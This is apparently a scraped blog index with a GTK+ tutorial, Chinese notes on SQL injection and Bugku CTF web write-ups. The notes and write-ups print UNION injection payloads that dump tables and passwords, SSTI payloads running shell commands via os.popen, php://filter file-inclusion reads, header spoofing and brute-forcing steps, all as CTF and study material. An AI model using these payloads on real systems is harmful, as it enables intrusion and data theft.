GTK程序简介  使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译\n 例： gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include \u0026lt;gtk/gtk.h\u0026gt; int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  // 代码区  gtk_main();\t// 主事件循环  return 0; } 分析：\n\u0026lt;gtk/gtk.h\u0026gt;\t// 头文件，包括了GTK+所有控件、变量、函数和结构的声明 gtk_init()\t// 必须在控件定义之前使用，参数由命令中解析出来并送到程序中。主要作用为设立GTK+运行环境，自动完成一些必要的初始化工作 gtk_main()\t// 程序运行停在这里等待事件(如键盘或鼠标事件)的发生，等待用户操作窗口。这个函数在所有GTK+程序中都要调用 GtkWidget* window = gtk_window_new(GTK_WINDOW_TOPLEVEL)\t// GtkWidget是GTK+控件类型，GtkWidget*能指向任何控件的指针类型 gtk_window_new()\t// 创建一个窗口并返回这个窗口的控件指针 GTK_WINDOW_TOPLEVEL\t// 指明窗口类型为最上层主窗口 gtk_widget_show(window)\t// 显示上一步创建的窗口控件  控件介绍\n 1.控件是对数据和方法的封装。控件有自己的属性和方法，属性是指控件的特征，方法是指控件的一些简单可见的功能。\n2.控件的分类：容器控件与非容器控件。\n容器控件：可以容纳别的控件。容器控件分为两类，一类只能容纳一个控件，如窗口、按钮；另一类则能容纳多个控件，如布局控件。\n非容器控件：不可以容纳别的控件，如标签、行编辑。\n 控件类型的转换\n 使用控件接口时，一定要注意参数类型是否匹配。\n窗口 // 窗口创建 GtkWidget *window = gtk_window_new(GtkWindowType); GtkWindowType是一个枚举，具体有两种情况： GTK_WINDOW_TOPLEVEL\t// 有边框 GTK_WINDOW_POPUP\t// 无边框  // 标题设置 void gtk_window_set_title(GtkWindow *window, const gchar *title); // 窗口最小尺寸设置 void gtk_widget_set_size_request(GtkWidget *widget,gint width,gint height); // 窗口伸缩设置 void gtk_window_set_resizable(GtkWindow *window, gboolean resizable); // 显示或隐藏所有控件 void gtk_widget_show_all(GtkWidget *widget); void gtk_widget_hide_all(GtkWidget *widget); // 窗口在显示器位置设置 void gtk_window_set_position(GtkWindow *window, GtkWindowPosition position); position常用有四种情况： GTK_WIN_POS_NONE\t// 不固定 GTK_WIN_POS_CENTER\t// 居中 GTK_WIN_POS_MOUSE\t// 出现在鼠标位置 GTK_WIN_POS_CENTER_ALWAYS\t//窗口总是居中 实例： #include \u0026lt;gtk/gtk.h\u0026gt; // 头文件 int main( int argc,char *argv[] ) { gtk_init(\u0026amp;argc, \u0026amp;argv); // 初始化 // 创建顶层窗口  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); // 设置窗口标题  gtk_window_set_title(GTK_WINDOW(window), \u0026#34;Window\u0026#34;); // 设置窗口在显示器中的位置为居中  gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER); // 设置窗口最小尺寸  gtk_widget_set_size_request(window, 400, 300); // 固定窗口的大小 \tgtk_window_set_resizable(GTK_WINDOW(window), FALSE); // \u0026#34;destroy\u0026#34; 和 gtk_main_quit 连接，关闭窗口时程序自动停止，否则需要按ctrl+c \tg_signal_connect(window, \u0026#34;destroy\u0026#34;, G_CALLBACK(gtk_main_quit), NULL); gtk_widget_show_all(window); // 显示窗口全部控件  //gtk_widget_hide_all(window); // 隐藏窗口  gtk_main(); // 主事件循环  return 0; } 窗口截图：\n按钮 // 创建一个带内容的按钮 GtkWidget* gtk_button_new_with_label(const gchar *label); // 获得按钮文本内容 const gchar* gtk_button_get_label(GtkButton *button ); // 将控件添加到窗口容器 void gtk_container_add(GtkContainer *container, GtkWidget *widget); container：容纳控件的容器；widget：要添加的控件 实例： #include \u0026lt;gtk/gtk.h\u0026gt;\t// 头文件 int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\t// 创建顶层窗口 \t// 设置窗口边框宽度(窗口里的控件与窗口边框间隔为15) \tgtk_container_set_border_width(GTK_CONTAINER(window), 15); // 创建按钮，文本信息为\u0026#34;Hello World\u0026#34; \tGtkWidget *button = gtk_button_new_with_label(\u0026#34;Hello World\u0026#34;); const char *str = gtk_button_get_label(GTK_BUTTON(button));\t// 获得按钮的内容 \tprintf(\u0026#34;str = %s\\n\u0026#34;, str);\t// 打印到终端  // 把按钮放入窗口(窗口也是一种容器) \tgtk_container_add(GTK_CONTAINER(window), button); // 显示控件有两种方法：逐个显示，全部显示 \t// gtk_widget_show(button); \t// gtk_widget_show(window); \tgtk_widget_show_all(window);\t// 显示窗口全部控件  gtk_main();\t// 主事件循环  return 0; } 运行截图：\n信号与回调函数 GTK+采用信号与回调函数处理窗口外部传来的事件、消息或信号。当信号发生时，程序自动调用为信号连接的回调函数。\n// 窗口关闭时触发的常用信号 destroy、delete-event // 操作按钮触发的常用信号 clicked、pressed、released // 信号与回调函数的连接 gulong g_signal_connect(gpointer instance, const gchar *detailed_signal, GCallback c_handler, gpointer data); instance\t:\t信号发出者 detailed_signale\t:\t要连接的信号名称 c_handler\t:\t回调函数名称，需要使用G_CALLBACK进行转换 data\t:\t传递给回调函数的参数 // 信号连接函数的写法 g_signal_connect(button, \u0026#34;pressed\u0026#34;, G_CALLBACK(callback), NULL); // 回调函数的定义 void callback(GtkButton *button, gpointer user_data); button\t:\t信号发出者 user_data\t:\t传递给回调函数的参数 实例： #include \u0026lt;gtk/gtk.h\u0026gt;\t// 头文件 // 按钮按下的处理函数, gpointer 相当于 void * void deal_pressed(GtkButton *button, gpointer user_data) { // 获得按钮的文本信息 \tconst gchar *text = gtk_button_get_label( button ); // g_print() 相当于C语言的 printf(), gchar相当于char \tg_print(\u0026#34;button_text = %s; user_data = %s\\n\u0026#34;, text, (gchar *)user_data); } int main( int argc,char *argv[] ) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); // 创建顶层窗口 \t// 设置窗口边框的宽度(窗口里的控件与窗口边框间隔为15) \tgtk_container_set_border_width(GTK_CONTAINER(window), 15); /* 当窗口关闭时，窗口会触发destroy信号， * 自动调用gtk_main_quit()结束程序运行。 */ g_signal_connect(window, \u0026#34;destroy\u0026#34;, G_CALLBACK(gtk_main_quit), NULL); GtkWidget *button = gtk_button_new_with_label(\u0026#34;Hello GTK+\u0026#34;); // 创建按钮 \tgtk_container_add(GTK_CONTAINER(window), button);\t// 把按钮放入窗口(窗口也是一种容器)  /* 按钮按下(pressed)后会自动调用deal_pressed() * \u0026#34;is pressed\u0026#34;是传给deal_pressed()的数据 */ g_signal_connect(button, \u0026#34;pressed\u0026#34;, G_CALLBACK(deal_pressed), \u0026#34;is pressed\u0026#34;); gtk_widget_show_all(window);\t// 显示窗口全部控件  gtk_main();\t// 主事件循环  return 0; } 运行截图：\n","permalink":"https://oopsdc.github.io/post/gtk+/","summary":"GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。\nGTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.\n学习手册  GTK+2手册：https://developer.gnome.org/gtk2/ GTK+3手册：https://developer.gnome.org/gtk3/ 中文手册：https://www.bookstack.cn/read/GTK-3-Chinese-Reference-Manual/README.md  GTK程序简介  使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译\n 例： gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include \u0026lt;gtk/gtk.h\u0026gt; int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  // 代码区  gtk_main();\t// 主事件循环  return 0; } 分析：\n\u0026lt;gtk/gtk.h\u0026gt;\t// 头文件，包括了GTK+所有控件、变量、函数和结构的声明 gtk_init()\t// 必须在控件定义之前使用，参数由命令中解析出来并送到程序中。主要作用为设立GTK+运行环境，自动完成一些必要的初始化工作 gtk_main()\t// 程序运行停在这里等待事件(如键盘或鼠标事件)的发生，等待用户操作窗口。这个函数在所有GTK+程序中都要调用 GtkWidget* window = gtk_window_new(GTK_WINDOW_TOPLEVEL)\t// GtkWidget是GTK+控件类型，GtkWidget*能指向任何控件的指针类型 gtk_window_new()\t// 创建一个窗口并返回这个窗口的控件指针 GTK_WINDOW_TOPLEVEL\t// 指明窗口类型为最上层主窗口 gtk_widget_show(window)\t// 显示上一步创建的窗口控件  控件介绍","title":"GTK+"},{"content":"SQL注入 规则 通过发送异常数据来触发异常。\n规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。\nWeb应用通常包含：表示层、逻辑层、数据层。\nSQL注入分类 有参数传递。\n参数带入数据库查询且执行。\n产生过程 web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。\n若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。\n若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。\n盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。\n强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。\n注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。\n拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。\n基本思想：收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。\n基于时间的盲注 所有相应都包含一种属性：发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。\n基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。\n常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常\n2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nm\u0026hellip;39;1'=\u0026lsquo;1\u0026rsquo;，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nb\u0026hellip;39;1'=\u0026lsquo;2\u0026rsquo;，xxx.asp运行异常。\n若这三步全满足，则xxx.asp一定存在SQL注入漏洞。\n特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。\n大小写混合：VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。\nUNICODE：UNICODE字符集实现国际化，+=%2B，space=%20。\nASCII：U=chr(85)，a=chr(97)。\n（二）判断后台数据库类型 查询数据库名称 1\u0026#39; union select 1,database(); 查询数据库表名 1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1\u0026#39; union select 1,group_concat(columns_name) from information_schema.columns where table_name=\u0026#39;tablename\u0026#39;; 获取数据库详细内容 1\u0026#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users; （三）判断数据库 SQL Server SQL Server有user，db_name()等系统变量，利用这些系统值不仅可以判断SQL Server，还能得到其他信息。\nSQL Server系统表为sysobjects，在Web环境下有访问权限。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and user\u0026gt;0，可以判断是否为SQL Server，还能得到当前连接到数据库的用户名。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;n\u0026hellip;db_name()\u0026gt;0，可以判断是否为SQL Server，还能得到当前正在使用的数据库名。\nAccess Access系统表为msysobjects，且在Web环境下没有访问权限。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from sysobjects)\u0026gt;0\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from msysobjects)\u0026gt;0\n若数据库为SQL Server，则第一条语句xxx.asp运行正常，第二条语句异常；若数据库为Access，两条语句均异常。\nMSSQL sysdatabase：系统表，每个数据库在表中占一行，该表只存储在master数据库中，保存了所有库名、库ID及一些相关信息。\nsysobjects：存放数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。\nsyscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行，该表位于每个数据库中。主要字段：name(字段名称)，id(表ID号)，colid(字段ID号)，id是sysobjects得到的表ID号。\n（四）确定XP_CMDSHELL可执行情况 ","permalink":"https://oopsdc.github.io/post/sql%E6%B3%A8%E5%85%A5/","summary":"SQL注入 规则 通过发送异常数据来触发异常。\n规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。\nWeb应用通常包含：表示层、逻辑层、数据层。\nSQL注入分类 有参数传递。\n参数带入数据库查询且执行。\n产生过程 web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。\n若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。\n若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。\n盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。\n强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。\n注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。\n拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。\n基本思想：收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。\n基于时间的盲注 所有相应都包含一种属性：发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。\n基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。\n常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常\n2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nm\u0026hellip;39;1'=\u0026lsquo;1\u0026rsquo;，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nb\u0026hellip;39;1'=\u0026lsquo;2\u0026rsquo;，xxx.asp运行异常。\n若这三步全满足，则xxx.asp一定存在SQL注入漏洞。\n特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。\n大小写混合：VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。\nUNICODE：UNICODE字符集实现国际化，+=%2B，space=%20。\nASCII：U=chr(85)，a=chr(97)。\n（二）判断后台数据库类型 查询数据库名称 1\u0026#39; union select 1,database(); 查询数据库表名 1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1\u0026#39; union select 1,group_concat(columns_name) from information_schema.","title":"SQL注入"},{"content":"Bugku Web Web1  Des:flag{}。\n 查看源码即可。\nWeb2  Des:输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des:flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;) value = {\u0026#39;what\u0026#39;:\u0026#39;flag\u0026#39;} r = s.post(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;, value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版：\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET[\u0026#39;num\u0026#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo \u0026#39;flag{********}\u0026#39;; } 利用1a绕过，例：\n?num=1a01\rWeb6  Des:flag{}。\n 查看源码。\nUnicode编码，解码即可。\nWeb7  Des:你必须让它停下。\n burp抓包，不断点击go发送页面，注意查看response。\nWeb8  Des:文件包含。\n 打开题目获得代码：\n\u0026lt;?php extract($_GET) if (!empty($ac)) { $f = trim(file_get_contents($fn)); if ($ac == $f) { echo \u0026#34;\u0026lt;p\u0026gt;This is flag:\u0026#34; .\u0026#34;$flag\u0026lt;/p\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;p\u0026gt;sorry!\u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt;按照题目描述，尝试访问flag.txt，\n文件内容为flags，获得flag的条件是ac和fn严格相等，fn从flag.txt进行赋值，通过GET传参?ac=flags\u0026amp;fn=flag.txt。\n获得flag。\n题目更新 ?hello=file(\u0026#39;flag.php\u0026#39;) Web9  Des:N/A。\n eval(\u0026#34;var_dump($$args);\u0026#34;) //调用两次，$($argc) 调用全局变量打印所有内容，尝试GLOBAL和GLOBALS。\nSimple_SSTI_1  Des:N/A。\n 页面显示：\nYou need pass in a parameter named flag。\r查看源码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Simple SSTI\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; You need pass in a parameter named flag。 \u0026lt;!-- You know, in the flask, We often set a secret_key variable.--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 搜了一下，SECRET_KEY是Flask中一个比较重要的变量值。\n?flag=flag\r# 页面回显flag\r?flag=2*2\r# 回显4，说明我们传入的数据是被信任的，存在ssti\r?flag=app.config['SECRET_KEY']\r# 回显报错\r?flag=config['SECRET_KEY']\r# 获得flag\rSimple_SSTI_2  Des:N/A。\n 页面和上题一样，也是模板注入。\n查看源码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Simple SSTI2\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; You need pass in a parameter named flag \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 查看根目录：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}\r执行结果：\napp bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var\r我们挨个查看目录，从第一个开始：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}\r执行结果：\nDockerfile app.py flag gunicorn.conf.py templates\r直接查看flag文件：\n?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}\r获得flag。\nWeb10  Des:头等舱。\n F12在Network查看消息头即可。\n计算器  Des:N/A。\n 尝试输入结果，但只能输入一位字符，查看控制台元素。\n找到对应的输入框元素，发现长度被限定为1位，修改后输入正确答案。\n获得flag。\nweb基础$_GET  Des:N/A。\n GET传参直接在URL后键入值即可。\n在URL后加上?what=flag。\n获得flag。\nweb基础$_POST  Des:N/A。\n 需要通过POST方式传入参数flag，使用hackbar插件。\n获得flag。\n矛盾  Des:N/A。\n 简单分析可知，GET传参，获取flag需要经过两个if判断：1.参数num不为数字；2.参数获取值为1。\n我们可以构造一个字符串，以1开头的字符串在php会被判定成功，在URL后输入?num=1x。\n获得flag。\n域名解析  Des:听说把网址解析到xxx就能拿到flag。\n Linux：vim /etc/hosts。\n添加：网址 xxx。\n保存后访问网址。\nWindows同理。\n获得flag。\n你必须让他停下  Des:N/A。\n 页面不断刷新，查看源码\n猜测flag就在网页中，不断刷新使我们无法看到，使用burp抓包。\n拦截页面后发送至Repeater，不断Go，查看Response。\n获得flag。\n本地包含 题目已挂。\n变量 \u0026lt;?php error_reporting(0); include \u0026#34;flag1.php\u0026#34;; highlight_file(__file__); if (isset($_GET[\u0026#39;args\u0026#39;])) { $args = $_GET[\u0026#39;args\u0026#39;]; if (!preg_match(\u0026#34;/^\\w+$/\u0026#34;, $args)) { die(\u0026#34;args error!\u0026#34;); } eval(\u0026#34;var_dump($$args);\u0026#34;); } ?\u0026gt;两个关键点：正则表达式和**$$args**。\n此处正则表达式匹配均为字母的串，匹配不成功则报错；$$args意为可变变量，若$args代表一个变量，那么$$args则代表另一个变量。尝试给args赋一个变量名。\nPHP九大全局变量：\n$_POST[接收post提交的数据]\n$_GET[接收GET提交的数据]\n$_FILES[文件接收处理]\n$_COOKIE[获取与setCookie()中的name值]\n$_SESSION[存储或获取session的值]\n$_REQUEST[有get，post的功能，但较慢]\n$_SERVER[预定义服务器的一种变量]\n$_GLOBALS[包含了全部变量的全局组合数组]\n$_ENV[包含服务器端环境变量的数组，是PHP中的超级变量，可以在PHP程序任何位置直接访问]。\n依次尝试，当传入?args=GLOBALS时成功获得flag。\n头等舱  Des:N/A。\n 查看源码，没有有用信息，尝试御剑扫描后台。\n发现md5.php，进行访问。\n通过GET传参输入a。\n唔，然后返回最开始的网址，使用burp进行抓包，查看Response。\n获得flag。\n网站被黑  Des:这个题没技术含量但是实战中经常遇到。\n 给出的访问目录是webshell御剑扫描后台，进入shell.php，此处对密码进行爆破，在shell处输入密码。\n获得flag。\n管理员系统  Des:N/A。\n 是一个登录窗口，查看控制台元素：\n\u0026lt;!-- dGVzdDEyMw== --\u0026gt;\r这是Base64编码，解码获得：\n\u0026lt;!-- test123 --\u0026gt;\r尝试用户名admin，密码test123。\n页面报错，显示IP禁止访问，猜测应该是对访问地址进行了限制，尝试利用X-Forwarde-For修改XFF头为127.0.0.1。\n 百度百科：XFF是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。\n 获得flag。\nflag在index里面  Des:N/A。\n 网页给出一个超链接，点击进行跳转。\n猜测这是admin的密码，查看源码，没有线索，查看URL，发现一个文件包含漏洞。\n这里使用了php的封装协议，资料：http://php.net/manual/zh/wrappers.php.php。\n首先尝试访问http://xxx:port/post/index.php?file=php://filter/resource=index.php。\n网页空白，源码也没有有用信息，但是有5w多行，可能flag藏在里面？\n尝试一下base64编码后访问：http://xxx:port/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php\n这是一个file关键字的GET传参，php://是协议名，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示将其进行base64编码后进行读取，resource=index.php就是我们所要访问的目的页面了。\nBase64编码后访问URL，得到一串加密字符串：\n进行Base64解码：\n\u0026lt;html\u0026gt;\r\u0026lt;title\u0026gt;Bugku-ctf\u0026lt;/title\u0026gt;\r\u0026lt;?php\rerror_reporting(0);\rif (!$_GET[file]) {\recho '\u0026lt;a href=\u0026quot;./index.php?file=show.php\u0026quot;\u0026gt;click me? no\u0026lt;/a\u0026gt;';\r}\r$file = $_GET['file'];\rif (strstr($file, \u0026quot;../\u0026quot;) || stristr($file, \u0026quot;tp\u0026quot;) || stristr($file, \u0026quot;input\u0026quot;) || stristr($file, \u0026quot;data\u0026quot;)) {\recho \u0026quot;Oh no!\u0026quot;;\rexit();\r}\rinclude($file);\r//flag:flag{edulcni_elif_lacol_si_siht}\r?\u0026gt;\r\u0026lt;/html\u0026gt;\r获得flag。\n输入密码查看flag  Des:N/A。\n URL：http://xxx:port/baopo/，源码没有有用信息，告知5位数，尝试使用burp进行数字爆破，范围10000-99999。\n随机输入密码后进行抓包。\n然后发送至Intruder，在Intruder界面先选择Clear清除所有Payload，再选中pwd后点击Add。\n在Payload菜单选择攻击字典。\n在Options菜单适当选择攻击线程，加快速度，不过过大的线程可能会导致自己的网络崩溃。\n点击右上角的Start Attack，进入到爆破界面。\n可以随时点击后四个菜单栏进行排序，查看有没有特殊情况，喝杯水的时间就能把整个范围跑完，输入产生特殊值的Payload。\n获得flag。\n点击一百万次  Des:JavaScript。\n 题目已挂。\n备份是个好习惯  Des:听说备份是个好习惯。\n 得到一串编码字符串：\nd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\r不晓得这是什么\u0026hellip;然后用御剑扫描后台，发现index.php.bak备份文件，下载使用cat命令查看。\n简单判断，需要进行md5碰撞获得flag，而且后台会自动替换掉key关键字，首先查找常见md5碰撞值，然后通过复写key关键字进行绕过：\n?kkeyey1=QNKCDZO\u0026amp;\u0026amp;kkeyey2=s878926199a\r将构造字符串置于URL最后，回车访问。\n获得flag。\n成绩单  Des:快来查查成绩吧。\n 输入框依次输入1，2，3并提交，成功回显成绩单，当输入4时，页面没有回显。\n查看源码，没有隐藏信息。在输入框输入1'，利用最常见的单引号判断是否存在SQL注入，页面没有回显，继续测试列数，猜测有姓名、数学、英语、语文四列，输入1' order by 4#，页面回显正常，尝试1' order by 5#，页面没有回显，判断表有四列。接下来尝试爆破库名、表名、字段名。\n尝试联合查询，在查询框输入id=1' union select 1,2,3,4#，将我们的代码通过POST传参达到执行的目的，页面回显如下，四个表均有回显。\n开始爆破库名：id=1' union select 1,2,3,database()#，获得库名skctf_flag。\n进一步爆破表名：id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_name = database()#，获得两个表：fl4g和sc。\n爆破字段名：id=1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 0x666c3467#，\n ps:尝试使用table_name = fl4g时，页面没有回显，将fl4g转为十六进制，0x代表引号。\n 获得字段名：skctf_flag。\n查看字段名内容：id=-1' union select 1,2,3,skctf_flag from fl4g#。\n获得flag。\n秋名山老司机  Des:是不是老司机试试就知道。\n 打开网页后，是一个计算问题，查看源代码。\n每次刷新之后，需要计算的数字都不一样，页面通过POST方式传值，这里尝试用python脚本来进行计算。\nimport requests import re s = requests.Session() r = s.get(\u0026#39;\u0026lt;url\u0026gt;\u0026#39;) obj = re.search(r\u0026#39;(\\d+[+\\-*])+(\\d+)\u0026#39;, r.text) d = { \u0026#39;value\u0026#39;: eval(obj.group(0)) } r = s.post(\u0026#39;\u0026lt;url\u0026gt;\u0026#39;) print(r.text) 需要访问网站，还需要利用正则表达式对网站给出的数字进行匹配，所以导入requests和re库。\n从requests库导入的类一定要为Session()，若是使用了session()，会导致网页刷新，不能获得正确的值。\ns是创建的会话对象，以会话对象向url发出一个get请求。\nr用来接受网站访问获得的数据，obj用来存储进行正则表达式匹配后的值，\\d+表示匹配一个或多个字符，[+\\-*]匹配加号、减号和乘号，但因为减号为特殊符号，这里使用反斜杠\\进行转义。re.search扫描一个字符串返回第一个匹配成功的值，r.text为服务器返回页面的内容，r表示字符串为原始字符串，里面的反斜杠\\不会被认为是转义符。\n下面创建字典d，键为value，键值为刚才匹配出的式子的值，eval计算式子的值，group(0)表示匹配的结果，索引从0开始，这里指匹配到的式子。\n以POST方式给url传值，参数data为默认值，不可更改。\n ps:参数之所以为data，是因为用burp抓包显示网页传递值的参数就是data，所以不能更改。\n 